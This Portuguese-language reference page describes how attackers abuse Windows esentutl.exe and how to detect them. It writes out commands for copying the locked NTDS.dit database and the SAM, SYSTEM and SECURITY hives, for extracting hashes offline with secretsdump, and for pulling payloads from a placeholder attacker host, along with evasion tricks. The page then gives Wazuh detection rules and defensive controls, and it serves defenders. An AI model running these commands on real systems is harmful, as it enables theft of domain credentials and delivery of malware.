# esentutl.exe

**Plataforma:** Windows

**Categorias:** Cópia de arquivos bloqueados, Download, Bypass de permissões de arquivo, AWL Bypass

**MITRE ATT&CK:** T1006 (Direct Volume Access), T1048 (Exfiltration), T1105 (Ingress Tool Transfer)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Esentutl/

---

## O que é o esentutl.exe

O esentutl.exe (Extensible Storage Engine Utility) é uma ferramenta de manutenção do banco de dados ESE (Extensible Storage Engine), o mecanismo de banco de dados embutido no Windows usado por componentes como o Active Directory, o Windows Search, o Exchange e o BITS. Seus usos legítimos incluem: verificação de integridade de banco de dados ESE, reparo de bancos de dados corrompidos, compactação e recuperação de bancos de dados.

A ferramenta aceita um parâmetro `/y` que copia arquivos, e essa funcionalidade foi exposta de forma a permitir cópia de arquivos que estão em uso ou bloqueados por outras aplicações — comportamento normalmente impossível com ferramentas padrão como `copy` ou `xcopy`.

---

## Por que atacantes usam o esentutl

O esentutl tem dois valores principais em pós-exploração. Primeiro, sua capacidade de copiar arquivos bloqueados: o Active Directory Domain Services mantém o banco de dados NTDS.dit e o arquivo de registro do sistema (SYSTEM hive) bloqueados enquanto o serviço está em execução. O esentutl pode copiá-los em produção sem parar o serviço, algo que ferramentas de cópia padrão não conseguem. Segundo, sua capacidade de fazer download de arquivos da internet — possível através da mesma funcionalidade de cópia mas apontada para uma URL.

---

## Técnicas de abuso

### Cópia do NTDS.dit sem parar o serviço

O NTDS.dit é o banco de dados do Active Directory que contém todos os hashes de senhas do domínio. Normalmente está bloqueado pelo processo `ntdss.exe` enquanto o controlador de domínio está em operação. O esentutl consegue copiá-lo:

```cmd
:: Copiar NTDS.dit em produção (arquivo bloqueado pelo AD)
esentutl.exe /y C:\Windows\NTDS\ntds.dit /d C:\Windows\Temp\ntds.dit /o

:: Copiar o SYSTEM hive (necessário para descriptografar o NTDS.dit)
esentutl.exe /y C:\Windows\System32\config\SYSTEM /d C:\Windows\Temp\SYSTEM /o

:: Copiar o SECURITY hive
esentutl.exe /y C:\Windows\System32\config\SECURITY /d C:\Windows\Temp\SECURITY /o
```

Com os três arquivos copiados para fora do servidor, o atacante pode processar o NTDS.dit offline com `impacket-secretsdump` ou similar:

```bash
# Offline, na máquina do atacante
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

### Download de arquivo via esentutl

```cmd
:: Download de arquivo via HTTP
esentutl.exe /y http://attacker.com/payload.exe /d C:\Windows\Temp\payload.exe /o

:: Alternativa com HTTPS
esentutl.exe /y https://attacker.com/tool.exe /d C:\Windows\Temp\tool.exe /o
```

Embora essa funcionalidade seja incomum como vetor de download (certutil e bitsadmin são mais confiáveis para isso), o esentutl pode servir como alternativa quando aqueles estão bloqueados.

### Cópia de outros arquivos bloqueados

```cmd
:: Copiar SAM database (senhas locais) — normalmente bloqueado pelo sistema
esentutl.exe /y C:\Windows\System32\config\SAM /d C:\Windows\Temp\SAM /o

:: Copiar NTDS.dit via shadow copy (alternativa via VSS)
:: Listar shadow copies disponíveis
vssadmin list shadows

:: Copiar via shadow copy
esentutl.exe /y \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit /d C:\Windows\Temp\ntds.dit /o
```

### Cópia de arquivos de log para exfiltração

```cmd
:: Copiar log de eventos de segurança
esentutl.exe /y C:\Windows\System32\winevt\Logs\Security.evtx /d C:\Windows\Temp\sec.evtx /o

:: Copiar logs de aplicação para análise offline
esentutl.exe /y C:\Windows\System32\winevt\Logs\Application.evtx /d C:\Windows\Temp\app.evtx /o
```

---

## Técnicas de bypass e evasão

### Usar shadow copy para reduzir detecção

```cmd
:: Criar shadow copy e copiar de lá — o acesso ao NTDS.dit via shadow copy
:: gera menos alertas do que acesso direto ao arquivo em uso
vssadmin create shadow /for=C:
esentutl.exe /y \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit /d C:\Windows\Temp\ntds.dit /o
```

### Renomear destino para extensão não suspeita

```cmd
:: Copiar NTDS.dit com extensão de arquivo de banco de dados comum
esentutl.exe /y C:\Windows\NTDS\ntds.dit /d C:\Windows\Temp\catalog.edb /o
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- esentutl.exe com argumento referenciando `ntds.dit`, `NTDS\`, ou `config\SAM` — acesso a banco de dados de credenciais
- esentutl.exe com argumento `/y` copiando arquivos de `config\SAM`, `config\SYSTEM`, `config\SECURITY` — dump de hives do registro
- esentutl.exe copiando de shadow copies — contorno de bloqueio de arquivo
- Criação de arquivos `.dit` ou `.edb` em diretórios temporários

**Indicadores de média relevância:**

- esentutl.exe com URL HTTP/HTTPS como fonte — download não convencional
- esentutl.exe executado por processo não relacionado a manutenção de banco de dados

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0203-lolbas_dump.xml -->

<!-- esentutl copiando NTDS.dit ou hives de credenciais -->
<rule id="100350" level="15">
  <if_group>sysmon</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)esentutl\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(ntds\.dit|\\NTDS\\|config\\SAM|config\\SYSTEM|config\\SECURITY)</field>
  <description>esentutl copiando banco de dados de credenciais do AD ou hives do registro — possivel dump de senhas</description>
  <mitre>
    <id>T1006</id>
    <id>T1003.003</id>
  </mitre>
</rule>

<!-- esentutl com download via HTTP/HTTPS -->
<rule id="100351" level="13">
  <if_group>sysmon</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)esentutl\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)https?://</field>
  <description>esentutl fazendo download de arquivo via URL — uso incomum para transferencia de ferramenta</description>
  <mitre>
    <id>T1105</id>
  </mitre>
</rule>

<!-- esentutl copiando de shadow copy -->
<rule id="100352" level="14">
  <if_group>sysmon</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)esentutl\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(HarddiskVolumeShadowCopy|GLOBALROOT)</field>
  <description>esentutl copiando arquivo de shadow copy — possivel extracao de arquivo bloqueado pelo sistema</description>
  <mitre>
    <id>T1006</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Manutenção de banco de dados do AD:** administradores de controladores de domínio usam o esentutl para verificar integridade e compactar o NTDS.dit durante janelas de manutenção planejada. O contexto distingue: em manutenção legítima, o AD DS está parado, não há necessidade de copiar arquivos bloqueados, e a operação é feita por um administrador de domínio identificado com ticket de mudança.

**Windows Search e Exchange:** o mecanismo ESE é usado pelo Windows Search e pelo Exchange. Manutenção desses bancos de dados pode envolver o esentutl, mas nunca o NTDS.dit ou os hives de registro do sistema.

---

## Proteção e controles defensivos

**Monitorar acesso ao NTDS.dit em tempo real:** configure uma SACL (System Access Control List) no arquivo `ntds.dit` e no diretório `%WINDIR%\NTDS\` para gerar eventos de auditoria (Event ID 4663) em qualquer acesso de leitura. Qualquer processo além do `ntdss.exe` acessando esse arquivo é altamente suspeito.

**Restringir VSS a administradores de domínio:** a criação de shadow copies requer privilégios administrativos, mas o acesso a shadow copies existentes pode ser mais permissivo. Restrinja o acesso ao Volume Shadow Copy Service e monitore criações de shadow copy em controladores de domínio.

**Tiered Administration:** implemente o modelo de administração em camadas (Tier 0, 1, 2) para controlar quem pode fazer login interativo em controladores de domínio. A maioria dos ataques ao NTDS.dit requer acesso administrativo local ao DC — limitar esse acesso reduz drasticamente a superfície de ataque.

---

## Referências

- LOLBAS — esentutl: https://lolbas-project.github.io/lolbas/Binaries/Esentutl/
- MITRE ATT&CK T1006: https://attack.mitre.org/techniques/T1006/
- MITRE ATT&CK T1003.003: https://attack.mitre.org/techniques/T1003/003/
